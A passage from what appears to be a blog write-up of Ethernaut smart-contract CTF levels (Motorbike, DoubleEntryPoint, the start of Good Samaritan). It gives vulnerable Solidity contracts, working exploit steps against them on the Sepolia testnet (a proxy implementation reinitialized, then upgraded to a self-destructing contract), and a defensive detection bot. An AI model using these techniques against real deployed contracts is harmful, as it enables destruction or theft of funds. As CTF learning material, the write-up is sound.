</span><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"addToWhitelist(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"
</span><span>
</span><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"addToWhitelist(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4"
</span><span>
</span><span style=color:#88c0d0>cast</span><span> send 0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4 </span><span style=color:#a3be8c>"attack()"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT --value 1000000000000000
</span></code></pre><h2 id=motorbike>Motorbike</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>
</span><span>pragma solidity <</span><span style=color:#b48ead>0.7.0</span><span>;
</span><span>
</span><span>import "openzeppelin-contracts-06/utils/Address.sol";
</span><span>import "openzeppelin-contracts-06/proxy/Initializable.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Motorbike </span><span>{
</span><span>    </span><span style=color:#616e88>// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span><span>    </span><span style=color:#81a1c1>bytes32 internal constant</span><span> _IMPLEMENTATION_SLOT </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>;
</span><span>    
</span><span>    struct </span><span style=color:#88c0d0>AddressSlot </span><span>{
</span><span>        </span><span style=color:#81a1c1>address</span><span> value;
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#616e88>// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_logic) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        require(Address.</span><span style=color:#88c0d0>isContract</span><span>(_logic), "ERC1967: new implementation is not a contract");
</span><span>        </span><span style=color:#88c0d0>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value </span><span style=color:#81a1c1>=</span><span> _logic;
</span><span>        (</span><span style=color:#81a1c1>bool</span><span> success,) </span><span style=color:#81a1c1>=</span><span> _logic.</span><span style=color:#81a1c1>delegatecall</span><span>(
</span><span>            </span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodeWithSignature</span><span>("initialize()")
</span><span>        );
</span><span>        require(success, "Call failed");
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Delegates the current call to `implementation`.
</span><span>    function </span><span style=color:#88c0d0>_delegate</span><span>(</span><span style=color:#81a1c1>address </span><span>implementation) </span><span style=color:#81a1c1>internal virtual </span><span>{
</span><span>        </span><span style=color:#616e88>// solhint-disable-next-line no-inline-assembly
</span><span>        assembly {
</span><span>            </span><span style=color:#88c0d0>calldatacopy</span><span>(</span><span style=color:#b48ead>0</span><span>, </span><span style=color:#b48ead>0</span><span>, </span><span style=color:#88c0d0>calldatasize</span><span>())
</span><span>            let result := </span><span style=color:#88c0d0>delegatecall</span><span>(</span><span style=color:#88c0d0>gas</span><span>(), implementation, </span><span style=color:#b48ead>0</span><span>, </span><span style=color:#88c0d0>calldatasize</span><span>(), </span><span style=color:#b48ead>0</span><span>, </span><span style=color:#b48ead>0</span><span>)
</span><span>            </span><span style=color:#88c0d0>returndatacopy</span><span>(</span><span style=color:#b48ead>0</span><span>, </span><span style=color:#b48ead>0</span><span>, </span><span style=color:#88c0d0>returndatasize</span><span>())
</span><span>            switch result
</span><span>            case </span><span style=color:#b48ead>0 </span><span>{ </span><span style=color:#88c0d0>revert</span><span>(</span><span style=color:#b48ead>0</span><span>, </span><span style=color:#88c0d0>returndatasize</span><span>()) }
</span><span>            default { </span><span style=color:#88c0d0>return</span><span>(</span><span style=color:#b48ead>0</span><span>, </span><span style=color:#88c0d0>returndatasize</span><span>()) }
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Fallback function that delegates calls to the address returned by `_implementation()`. 
</span><span>    </span><span style=color:#616e88>// Will run if no other function in the contract matches the call data
</span><span>    fallback () </span><span style=color:#81a1c1>external payable virtual </span><span>{
</span><span>        </span><span style=color:#88c0d0>_delegate</span><span>(</span><span style=color:#88c0d0>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Returns an `AddressSlot` with member `value` located at `slot`.
</span><span>    function </span><span style=color:#88c0d0>_getAddressSlot</span><span>(</span><span style=color:#81a1c1>bytes32 </span><span>slot) </span><span style=color:#81a1c1>internal pure </span><span>returns (AddressSlot storage r) {
</span><span>        assembly {
</span><span>            r_slot := slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Engine </span><span>is </span><span style=color:#88c0d0>Initializable </span><span>{
</span><span>    </span><span style=color:#616e88>// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span><span>    </span><span style=color:#81a1c1>bytes32 internal constant</span><span> _IMPLEMENTATION_SLOT </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>;
</span><span>
</span><span>    </span><span style=color:#81a1c1>address public</span><span> upgrader;
</span><span>    </span><span style=color:#81a1c1>uint256 public</span><span> horsePower;
</span><span>
</span><span>    struct </span><span style=color:#88c0d0>AddressSlot </span><span>{
</span><span>        </span><span style=color:#81a1c1>address</span><span> value;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>initialize</span><span>() </span><span style=color:#81a1c1>external initializer </span><span>{
</span><span>        horsePower </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>1000</span><span>;
</span><span>        upgrader </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Upgrade the implementation of the proxy to `newImplementation`
</span><span>    </span><span style=color:#616e88>// subsequently execute the function call
</span><span>    function </span><span style=color:#88c0d0>upgradeToAndCall</span><span>(</span><span style=color:#81a1c1>address </span><span>newImplementation, </span><span style=color:#81a1c1>bytes memory </span><span>data) </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>        </span><span style=color:#88c0d0>_authorizeUpgrade</span><span>();
</span><span>        </span><span style=color:#88c0d0>_upgradeToAndCall</span><span>(newImplementation, data);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Restrict to upgrader role
</span><span>    function </span><span style=color:#88c0d0>_authorizeUpgrade</span><span>() </span><span style=color:#81a1c1>internal view </span><span>{
</span><span>        require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> upgrader, "Can't upgrade");
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
</span><span>    function </span><span style=color:#88c0d0>_upgradeToAndCall</span><span>(
</span><span>        </span><span style=color:#81a1c1>address </span><span>newImplementation,
</span><span>        </span><span style=color:#81a1c1>bytes memory </span><span>data
</span><span>    ) </span><span style=color:#81a1c1>internal </span><span>{
</span><span>        </span><span style=color:#616e88>// Initial upgrade and setup call
</span><span>        </span><span style=color:#88c0d0>_setImplementation</span><span>(newImplementation);
</span><span>        if (data.</span><span style=color:#81a1c1>length > </span><span style=color:#b48ead>0</span><span>) {
</span><span>            (</span><span style=color:#81a1c1>bool</span><span> success,) </span><span style=color:#81a1c1>=</span><span> newImplementation.</span><span style=color:#81a1c1>delegatecall</span><span>(data);
</span><span>            require(success, "Call failed");
</span><span>        }
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#616e88>// Stores a new address in the EIP1967 implementation slot.
</span><span>    function </span><span style=color:#88c0d0>_setImplementation</span><span>(</span><span style=color:#81a1c1>address </span><span>newImplementation) </span><span style=color:#81a1c1>private </span><span>{
</span><span>        require(Address.</span><span style=color:#88c0d0>isContract</span><span>(newImplementation), "ERC1967: new implementation is not a contract");
</span><span>        
</span><span>        AddressSlot </span><span style=color:#81a1c1>storage </span><span>r;
</span><span>        assembly {
</span><span>            r_slot := _IMPLEMENTATION_SLOT
</span><span>        }
</span><span>        r.value </span><span style=color:#81a1c1>=</span><span> newImplementation;
</span><span>    }
</span><span>}
</span></code></pre><p>Not properly initialized. It means that the specified upgrader can be initialized again at the implementation address<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span style=color:#616e88>// deployed at 0x95800066C789e89C33f6Bac781fF16795e0922af
</span><span>pragma solidity </span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>  function </span><span style=color:#88c0d0>suic1de</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    </span><span style=color:#81a1c1>selfdestruct</span><span>(</span><span style=color:#81a1c1>payable</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#b48ead>0</span><span>)));
</span><span>  }
</span><span>}
</span></code></pre><pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#81a1c1>> </span><span>(</span><span style=color:#88c0d0>await</span><span> web3.eth.getStorageAt(instance, </span><span style=color:#a3be8c>'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'</span><span>).then(v=</span><span style=color:#81a1c1>></span><span>v.toString()))</span><span style=color:#88c0d0>.slice</span><span>(26)
</span><span style=color:#81a1c1>< </span><span style=color:#b48ead>0</span><span style=color:#88c0d0>x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746
</span></code></pre><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "initialize()" --rpc-url https:</span><span style=color:#616e88>//1rpc.io/sepolia --private-key $PRVT
</span><span>root@aliyunhk:~# cast call 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgrader()" --rpc-url https:</span><span style=color:#616e88>//1rpc.io/sepolia
</span><span>root@aliyunhk:~# chisel
</span><span>Welcome to Chisel! Type `!help` to show available commands.
</span><span>➜ </span><span style=color:#81a1c1>bytes memory</span><span> a </span><span style=color:#81a1c1>= abi</span><span>.</span><span style=color:#81a1c1>encodeWithSelector</span><span>(</span><span style=color:#81a1c1>bytes4</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>("suic1de()")))
</span><span>➜ a
</span><span>Type: dynamic </span><span style=color:#81a1c1>bytes
</span><span>├ Hex (Memory):
</span><span>├─ Length ([</span><span style=color:#b48ead>0x00</span><span>:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000004
</span><span>├─ Contents ([</span><span style=color:#b48ead>0x20</span><span>:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
</span><span>├ Hex (Tuple Encoded):
</span><span>├─ Pointer ([</span><span style=color:#b48ead>0x00</span><span>:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000020
</span><span>├─ Length ([</span><span style=color:#b48ead>0x20</span><span>:0x40]): 0x0000000000000000000000000000000000000000000000000000000000000004
</span><span>└─ Contents ([</span><span style=color:#b48ead>0x40</span><span>:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
</span><span>root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgradeToAndCall(</span><span style=color:#81a1c1>address</span><span>,</span><span style=color:#81a1c1>bytes memory</span><span>)" --rpc-url https:</span><span style=color:#616e88>//1rpc.io/sepolia --private-key $PRVT -- 0x95800066C789e89C33f6Bac781fF16795e0922af 0x82617c2f
</span></code></pre><h2 id=doubleentrypoint>DoubleEntryPoint</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import "openzeppelin-contracts-08/access/Ownable.sol";
</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
</span><span>
</span><span>interface </span><span style=color:#88c0d0>DelegateERC20 </span><span>{
</span><span>  function </span><span style=color:#88c0d0>delegateTransfer</span><span>(</span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint256 </span><span>value, </span><span style=color:#81a1c1>address </span><span>origSender) </span><span style=color:#81a1c1>external </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>);
</span><span>}
</span><span>
</span><span>interface </span><span style=color:#88c0d0>IDetectionBot </span><span>{
</span><span>    function </span><span style=color:#88c0d0>handleTransaction</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span><span>
</span><span>interface </span><span style=color:#88c0d0>IForta </span><span>{
</span><span>    function </span><span style=color:#88c0d0>setDetectionBot</span><span>(</span><span style=color:#81a1c1>address </span><span>detectionBotAddress) </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>notify</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>raiseAlert</span><span>(</span><span style=color:#81a1c1>address </span><span>user) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Forta </span><span>is </span><span style=color:#88c0d0>IForta </span><span>{
</span><span>  mapping(</span><span style=color:#81a1c1>address </span><span>=> IDetectionBot) </span><span style=color:#81a1c1>public</span><span> usersDetectionBots;
</span><span>  mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint256</span><span>) </span><span style=color:#81a1c1>public</span><span> botRaisedAlerts;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setDetectionBot</span><span>(</span><span style=color:#81a1c1>address </span><span>detectionBotAddress) </span><span style=color:#81a1c1>external override </span><span>{
</span><span>      usersDetectionBots[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>IDetectionBot</span><span>(detectionBotAddress);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>notify</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external override </span><span>{
</span><span>    if(</span><span style=color:#81a1c1>address</span><span>(usersDetectionBots[user]) </span><span style=color:#81a1c1>== address</span><span>(</span><span style=color:#b48ead>0</span><span>)) return;
</span><span>    try usersDetectionBots[user].</span><span style=color:#88c0d0>handleTransaction</span><span>(user, msgData) {
</span><span>        return;
</span><span>    } catch {}
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>raiseAlert</span><span>(</span><span style=color:#81a1c1>address </span><span>user) </span><span style=color:#81a1c1>external override </span><span>{
</span><span>      if(</span><span style=color:#81a1c1>address</span><span>(usersDetectionBots[user]) </span><span style=color:#81a1c1>!= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>) return;
</span><span>      botRaisedAlerts[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>+= </span><span style=color:#b48ead>1</span><span>;
</span><span>  } 
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>CryptoVault </span><span>{
</span><span>    </span><span style=color:#81a1c1>address public</span><span> sweptTokensRecipient;
</span><span>    </span><span style=color:#81a1c1>IERC20 public</span><span> underlying;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>recipient) {
</span><span>        sweptTokensRecipient </span><span style=color:#81a1c1>=</span><span> recipient;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>setUnderlying</span><span>(</span><span style=color:#81a1c1>address </span><span>latestToken) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        require(</span><span style=color:#81a1c1>address</span><span>(underlying) </span><span style=color:#81a1c1>== address</span><span>(</span><span style=color:#b48ead>0</span><span>), "Already set");
</span><span>        underlying </span><span style=color:#81a1c1>= IERC20</span><span>(latestToken);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>/*
</span><span style=color:#616e88>    ...
</span><span style=color:#616e88>    */
</span><span>
</span><span>    function </span><span style=color:#88c0d0>sweepToken</span><span>(</span><span style=color:#81a1c1>IERC20 </span><span>token) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        require(token </span><span style=color:#81a1c1>!=</span><span> underlying, "Can't transfer underlying token");
</span><span>        token.</span><span style=color:#88c0d0>transfer</span><span>(sweptTokensRecipient, token.</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>LegacyToken </span><span>is </span><span style=color:#81a1c1>ERC20</span><span>("LegacyToken", "LGT"), </span><span style=color:#88c0d0>Ownable </span><span>{
</span><span>    DelegateERC20 </span><span style=color:#81a1c1>public </span><span>delegate;
</span><span>
</span><span>    function </span><span style=color:#88c0d0>mint</span><span>(</span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint256 </span><span>amount) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>        </span><span style=color:#88c0d0>_mint</span><span>(to, amount);
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>delegateToNewContract</span><span>(DelegateERC20 newContract) </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>        delegate </span><span style=color:#81a1c1>=</span><span> newContract;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address </span><span>to, </span><span style=color:#81a1c1>uint256 </span><span>value) </span><span style=color:#81a1c1>public override </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>        if (</span><span style=color:#81a1c1>address</span><span>(delegate) </span><span style=color:#81a1c1>== address</span><span>(</span><span style=color:#b48ead>0</span><span>)) {
</span><span>            return </span><span style=color:#81a1c1>super</span><span>.</span><span style=color:#88c0d0>transfer</span><span>(to, value);
</span><span>        } else {
</span><span>            return delegate.</span><span style=color:#88c0d0>delegateTransfer</span><span>(to, value, </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>);
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>DoubleEntryPoint </span><span>is </span><span style=color:#81a1c1>ERC20</span><span>("DoubleEntryPointToken", "DET"), </span><span style=color:#88c0d0>DelegateERC20</span><span>, </span><span style=color:#88c0d0>Ownable </span><span>{
</span><span>    </span><span style=color:#81a1c1>address public</span><span> cryptoVault;
</span><span>    </span><span style=color:#81a1c1>address public</span><span> player;
</span><span>    </span><span style=color:#81a1c1>address public</span><span> delegatedFrom;
</span><span>    Forta </span><span style=color:#81a1c1>public </span><span>forta;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>legacyToken, </span><span style=color:#81a1c1>address </span><span>vaultAddress, </span><span style=color:#81a1c1>address </span><span>fortaAddress, </span><span style=color:#81a1c1>address </span><span>playerAddress) {
</span><span>        delegatedFrom </span><span style=color:#81a1c1>=</span><span> legacyToken;
</span><span>        forta </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Forta</span><span>(fortaAddress);
</span><span>        player </span><span style=color:#81a1c1>=</span><span> playerAddress;
</span><span>        cryptoVault </span><span style=color:#81a1c1>=</span><span> vaultAddress;
</span><span>        </span><span style=color:#88c0d0>_mint</span><span>(cryptoVault, </span><span style=color:#b48ead>100 ether</span><span>);
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>onlyDelegateFrom</span><span>() {
</span><span>        require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> delegatedFrom, "Not legacy contract");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>fortaNotify</span><span>() {
</span><span>        </span><span style=color:#81a1c1>address</span><span> detectionBot </span><span style=color:#81a1c1>= address</span><span>(forta.</span><span style=color:#88c0d0>usersDetectionBots</span><span>(player));
</span><span>
</span><span>        </span><span style=color:#616e88>// Cache old number of bot alerts
</span><span>        </span><span style=color:#81a1c1>uint256</span><span> previousValue </span><span style=color:#81a1c1>=</span><span> forta.</span><span style=color:#88c0d0>botRaisedAlerts</span><span>(detectionBot);
</span><span>
</span><span>        </span><span style=color:#616e88>// Notify Forta
</span><span>        forta.</span><span style=color:#88c0d0>notify</span><span>(player, </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>data</span><span>);
</span><span>
</span><span>        </span><span style=color:#616e88>// Continue execution
</span><span>        _;
</span><span>
</span><span>        </span><span style=color:#616e88>// Check if alarms have been raised
</span><span>        if(forta.</span><span style=color:#88c0d0>botRaisedAlerts</span><span>(detectionBot) </span><span style=color:#81a1c1>></span><span> previousValue) revert("Alert has been triggered, reverting");
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>delegateTransfer</span><span>(
</span><span>        </span><span style=color:#81a1c1>address </span><span>to,
</span><span>        </span><span style=color:#81a1c1>uint256 </span><span>value,
</span><span>        </span><span style=color:#81a1c1>address </span><span>origSender
</span><span>    ) </span><span style=color:#81a1c1>public override onlyDelegateFrom fortaNotify </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>        </span><span style=color:#88c0d0>_transfer</span><span>(origSender, to, value);
</span><span>        return </span><span style=color:#81a1c1>true</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><p>There’s totally 5 contracts paticipated in this challenge. After sorting, the relationship diagram and call flow chart drawn are as follows:<p><img alt=DoubleEntryPoint src=/blog/ethernaut/Ethernaut/DoubleEntryPoint.svg><p>And at the end of tx, CA <code>ERC20 DET</code> would check if the <code>raiseAlert</code> has been triggered. And if it’s ture the tx would be revert. (which I haven’t mentioned in the picture).<p>To solve this challenge just write a <code>DetectionBot</code> to avoid the <code>CryptoVault</code> being drained out of tokens.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.0</span><span>;
</span><span>
</span><span>interface </span><span style=color:#88c0d0>IDetectionBot </span><span>{
</span><span>    function </span><span style=color:#88c0d0>handleTransaction</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span><span>
</span><span>interface </span><span style=color:#88c0d0>IForta </span><span>{
</span><span>    function </span><span style=color:#88c0d0>setDetectionBot</span><span>(</span><span style=color:#81a1c1>address </span><span>detectionBotAddress) </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>notify</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>raiseAlert</span><span>(</span><span style=color:#81a1c1>address </span><span>user) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>DetectionBot </span><span>is </span><span style=color:#88c0d0>IDetectionBot </span><span>{
</span><span>    </span><span style=color:#81a1c1>address</span><span> cryptoVault;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_cryptoVault) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        cryptoVault </span><span style=color:#81a1c1>=</span><span> _cryptoVault;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>handleTransaction</span><span>(</span><span style=color:#81a1c1>address </span><span>user, </span><span style=color:#81a1c1>bytes calldata </span><span>msgData) </span><span style=color:#81a1c1>external override </span><span>{
</span><span>
</span><span>        </span><span style=color:#81a1c1>address</span><span> origSender;
</span><span>        assembly {
</span><span>            </span><span style=color:#616e88>// select `origSender` from calldata. 
</span><span>            </span><span style=color:#616e88>// https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi.
</span><span>            </span><span style=color:#616e88>// could see others writeup for details :D
</span><span>            origSender := </span><span style=color:#88c0d0>calldataload</span><span>(</span><span style=color:#b48ead>0xa8</span><span>)
</span><span>        }
</span><span>
</span><span>        if(origSender </span><span style=color:#81a1c1>==</span><span> cryptoVault) {
</span><span>            </span><span style=color:#88c0d0>IForta</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>).</span><span style=color:#88c0d0>raiseAlert</span><span>(user);
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>< await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>forta</span><span>()
</span><span style=color:#81a1c1>> </span><span style=color:#a3be8c>'0x902389eFE38022B065DFBFB4D9F9F065aC1d7004'
</span><span style=color:#81a1c1>< await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>cryptoVault</span><span>()
</span><span style=color:#81a1c1>> </span><span style=color:#a3be8c>'0xd402609c99EC210563e32b24934b7FF98dF3f4c0'
</span></code></pre><pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#88c0d0>cast</span><span> send 0x902389eFE38022B065DFBFB4D9F9F065aC1d7004 </span><span style=color:#a3be8c>"setDetectionBot(address)"</span><span> --rpc-url https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> --</span><span> 0xCf5D488ff4Ec2Ce88dE6a823bFE6C080BB35523C
</span></code></pre><h2 id=good-samaritan>Good Samaritan</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity >=</span><span style=color:#b48ead>0.8.0 </span><span><</span><span style=color:#b48ead>0.9.0</span><span>;
</span><span>
</span><span>import "openzeppelin-contracts-08/utils/Address.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>GoodSamaritan </span><span>{
</span><span>    Wallet </span><span style=color:#81a1c1>public </span><span>wallet;
</span><span>    Coin </span><span style=color:#81a1c1>public </span><span>coin;
</span><span>
</span><span>    constructor() {
</span><span>        wallet </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#88c0d0>Wallet</span><span>();
</span><span>        coin </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#88c0d0>Coin</span><span>(</span><span style=color:#81a1c1>address</span><span>(wallet));
</span><span>
</span><span>        wallet.</span><span style=color:#88c0d0>setCoin</span><span>(coin);
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>requestDonation</span><span>() </span><span style=color:#81a1c1>external </span><span>returns(</span><span style=color:#81a1c1>bool</span><span> enoughBalance){
</span><span>        </span><span style=color:#616e88>// donate 10 coins to requester
</span><span>        try wallet.</span><span style=color:#88c0d0>donate10</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>) {
</span><span>            return </span><span style=color:#81a1c1>true</span><span>;
</span><span>        } catch (</span><span style=color:#81a1c1>bytes memory </span><span>err) {
</span><span>            if (</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodeWithSignature</span><span>("NotEnoughBalance()")) </span><span style=color:#81a1c1>== keccak256</span><span>(err)) {
</span><span>                </span><span style=color:#616e88>// send the coins left
</span><span>                wallet.</span><span style=color:#88c0d0>transferRemainder</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>);
</span><span>                return </span><span style=color:#81a1c1>false</span><span>;
</span><span>            }
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Coin </span><span>{
</span><span>    using Address for </span><span style=color:#81a1c1>address</span><span>;
</span><span>
</span><span>    mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint256</span><span>) </span><span style=color:#81a1c1>public</span><span> balances;
</span><span>
</span><span>    error </span><span style=color:#88c0d0>InsufficientBalance</span><span>(</span><span style=color:#81a1c1>uint256 </span><span>current, </span><span style=color:#81a1c1>uint256 </span><span>required);
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>wallet_) {
